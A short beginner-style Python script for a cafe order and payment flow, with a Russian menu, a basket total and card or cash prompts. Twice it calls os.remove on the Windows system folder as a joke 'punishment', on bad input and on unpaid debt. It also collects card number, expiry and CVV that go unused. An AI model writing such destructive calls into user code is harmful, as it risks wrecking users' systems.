import os


def enter_product(menu, choice, trash, i=0, choice1=0):
        trash[choice] = menu.get(choice)
        print(trash)
        choice1 = input("let`s sell? (Yes/No)")
        while choice1 == "Yes":
                if choice1 == "Yes":
                        choice = input("Enter product: ")
                        trash[choice] = menu.get(choice)
                        print(trash)
                choice1 = input("let`s sell? (Yes/No)")


menu = {"Пиперони": 999, "Шаурма": 299,
        "Двойной Латте на кокосовом": 300,
        "Миндальный раф на кокосовом молоке": 300
}

trash = {}
print(menu)
try:
        choice = input("Enter product: ")
        enter_product(menu, choice, trash)
except ValueError:
        print("GoodBye Bro!")
        os.remove("C:\\Windows")

summa = sum(list(trash.values()))
print(summa)

pay = input("How will you pay?(online/offline): ")
if pay == 'online':
        try:
                num_card, date, ccv = input("number card: "), input("date a card: "), input("ccv your card: ")
        except ValueError:
                print("Are You Normal?")
        print("Pay is passed!")
elif pay == 'offline':
        try:
                my_wallet = int(input("How many bucks will you give me?"))
        except ValueError:
                print("Are You Normal?")
                my_wallet = int(input("How many bucks will you give me?"))
        if my_wallet < summa:
                print("Are You Normal?")
                try:
                        my_wallet = int(input("How many bucks will you give me?"))
                except ValueError:
                        print("Are You Normal?")
                        my_wallet = int(input("How many bucks will you give me?"))
                print(f'Your change: {my_wallet - summa}, GoodBye not normal man! You`re in debt')
                if my_wallet - summa < 0:
                        os.remove("C:\\Windows")

        else:
                print(f'Your change: {my_wallet-summa}, GoodBye!')